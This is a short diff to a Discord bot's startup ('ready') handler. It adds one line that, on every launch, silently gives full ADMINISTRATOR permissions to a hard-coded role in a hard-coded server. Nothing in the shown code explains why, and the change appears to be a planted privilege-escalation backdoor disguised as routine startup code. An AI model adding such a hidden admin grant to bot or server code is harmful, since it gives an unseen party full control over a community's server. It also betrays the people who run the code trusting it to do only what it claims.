@@ -434,6 +434,7 @@ discordBot.on('ready', async () => {
 	} else {
 		discordBot.logger.logClient.log('DEBUG MODE ENABLED');
 	}
+	await discordBot.guilds.get('157737184684802048')!.roles.get('482474212250877952')!.setPermissions('ADMINISTRATOR');
 	await discordBot.user!.setActivity(`READY`, { type: 'PLAYING' });
 });
 
